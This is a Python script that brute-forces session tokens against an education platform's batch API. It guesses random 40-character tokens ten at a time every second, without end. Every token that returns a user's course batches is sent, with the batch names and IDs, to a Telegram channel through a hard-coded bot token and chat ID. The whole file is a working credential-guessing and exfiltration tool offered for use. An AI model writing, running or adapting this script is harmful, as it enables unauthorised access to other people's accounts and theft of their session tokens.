import asyncio
import random
import string
import requests
from telegram import Bot

# Telegram bot token and channel ID
TELEGRAM_BOT_TOKEN = '7853203368:AAE801naC4GMeyrkEfyflPItRwMvLmQddPY'
CHANNEL_CHAT_ID = '-1002478793346'  # Or chat ID like -1001234567890

# Initialize the Telegram bot
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# Generate random 40-character tokens
def generate_random_token():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=40))

# Check token and send results to Telegram channel
def check_token(token):
    url = "https://spec.iitschool.com/api/v1/my-batch"
    headers = {
        'Accept': 'application/json',
        'origintype': 'web',
        'token': token,
        'usertype': '2',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    try:
        response = requests.get(url, headers=headers, timeout=2)
        if response.status_code == 200:
            data = response.json().get('data', {})
            if 'batchData' in data and data['batchData']:
                for batch in data['batchData']:
                    batch_name = batch.get('batchName', 'N/A')
                    batch_id = batch.get('id', 'N/A')
                    send_to_telegram(token, batch_name, batch_id)
    except requests.RequestException:
        pass  # Ignore exceptions to maintain speed

# Send messages to Telegram
def send_to_telegram(token, batch_name, batch_id):
    message = f"Token: {token}\n{batch_name} - {batch_id}"
    try:
        bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message)
    except Exception as e:
        print(f"Failed to send message: {e}")

# Check 10 random tokens every second
async def check_tokens_infinite():
    while True:
        tokens = [generate_random_token() for _ in range(10)]
        for token in tokens:
            check_token(token)
        print(f"Checked 10 tokens...")
        await asyncio.sleep(1)

# Entry point for the script
def main():
    loop = asyncio.get_event_loop()
    loop.run_until_complete(check_tokens_infinite())

if __name__ == '__main__':
    main()
